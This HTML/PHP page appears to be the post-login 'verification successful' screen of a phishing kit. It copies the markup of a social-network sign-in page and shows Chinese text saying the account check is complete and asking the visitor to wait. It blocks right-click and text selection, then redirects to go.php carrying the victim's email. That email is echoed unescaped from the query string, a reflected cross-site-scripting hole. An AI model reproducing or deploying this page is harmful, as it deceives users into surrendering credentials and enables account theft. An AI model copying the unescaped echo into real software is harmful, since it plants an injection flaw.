<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>


<body bgColor="#FFFFFF">
<meta HTTP-EQUIV="REFRESH" content="7; url=go.php?email=<?php echo $_GET['email']; ?>">
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'/>
<link rel="stylesheet" href="files/i.css">
<link rel="stylesheet" href="files/ii.css">
<title>验证成功</title>
<link href="../files/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="files/bootstrap.css" rel="stylesheet">
<link href="files/signin.css" rel="stylesheet">
<link href="files/errors.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.style1 {font-size: 18px}
-->
</style>
</head>
<body class="highline logged-out ms-windows" data-fouc-class-names="swift-loading" dir="ltr" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <div id="doc" class="route-login login-responsive">
        <div class="topbar js-topbar">
  <div id="banners" class="js-banners">
  </div>
  <div class="global-nav" data-section-term="top_nav">
    <div class="global-nav-inner">
      <div class="container">
<spam class="nav js-global-actions"> <spam class="home" data-global-action="t1home">  
<a  href="#" data-nav="front">  </a>   </spam> </spam>  <div class="pull-right">  <spam class="nav secondary-nav language-dropdown"> <spam class="dropdown js-language-dropdown"> <spam class="dropdown-toggle js-dropdown-toggle"> <span class="js-current-language">
<div id="google_translate_element" align="left">
<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, multilanguagePage: true}, 'google_translate_element');
}
</script><script type="text/javascript" src="files/element.js?cb=googleTranslateElementInit"></script></div></span> <b class="caret"></b> <div class="dropdown-menu"> <div class="dropdown-caret right"> <span class="caret-outer"> </span> <span class="caret-inner"></span> </div>   </div></spam>   </div>
</div>
</div>
</div>
</div>
<div id="page-outer">
<div id="page-container" class="AppContent wrapper wrapper-login white">
<div class="page-canvas">
<div >
<div class="form-signin" role="form" >
<h3 class="loaded" style="text-align: center;"><br />
<span style="color:#006400;"> 帐户验证已完成 </span> </h3>

</div>


<span class="style1"><font size="18">





</font></span><span class="style1"> </span>
<NOSCRIPT>
<span class="style1"><IMG height=1 src="#"

width=1></span></NOSCRIPT>
</div>

  <div class="clearfix mobile has-sms">
    <p class="signup-helper" style="text-align: center;"><span style="color:#800000;">请稍候.... </span></p>
    </div>

</div>

          </div>
        </div>
      
    </div>
    <div class="gallery-overlay"></div>
<div class="modal-overlay"></div>




<div id="create-custom-timeline-dialog" class="modal-container"></div>
<div id="edit-custom-timeline-dialog" class="modal-container"></div>
<div id="curate-dialog" class="modal-container"></div>


    <div id="spoonbill-outer"></div>
</body>
</html>